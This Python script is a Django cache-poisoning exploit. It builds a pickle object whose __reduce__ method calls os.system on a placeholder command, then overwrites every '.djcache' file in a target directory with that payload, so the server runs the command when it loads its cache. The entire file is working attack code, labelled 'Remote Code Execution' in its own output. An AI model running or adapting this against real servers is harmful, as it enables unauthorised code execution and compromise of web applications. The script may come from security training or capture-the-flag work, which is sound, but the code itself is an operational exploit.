import os
import pickle
import argparse

# --- Argument Configuration --- #
parser = argparse.ArgumentParser(description="Django Cache Deserializer.")
parser.add_argument(
    "-d",
    "--dir",
    help="Path to Django cache directory (Example: /var/tmp/django_cache)",
    required=True
)
args = parser.parse_args()

cache_dir = args.dir

# --- Payload Structure --- #
class RCE:
    def __reduce__(self):
        cmd = "< PAYLOAD >"
        return (os.system, (cmd,),)

payload = pickle.dumps(RCE())

# --- Cache Poisoning Logic --- #
print(f"\n🔵 Looking for '.djcache' files in {cache_dir}...")
print(f"☣️ Payload: Remote Code Execution\n")

try:
    all_files = os.listdir(cache_dir)
    cache_files = [f for f in all_files if f.endswith(".djcache")]

    if not cache_files:
        print(f"🔴 No files found in {cache_dir}")
        print(f"💡 Try to visit the website to generate new cache files first\n")

    else:
        for filename in cache_files:
            path = os.path.join(cache_dir, filename)
            print(f"🟢 Cache file finded: {path}")

            try:
                os.remove(path)
                with open(path, "wb") as f:
                    f.write(payload)
                print(f"🟢 Cache file poisoned: {path}\n")

            except Exception as e:
                print(f"⚠️ {e}\n")

except Exception as e:
    print(f"⚠️ {e}\n")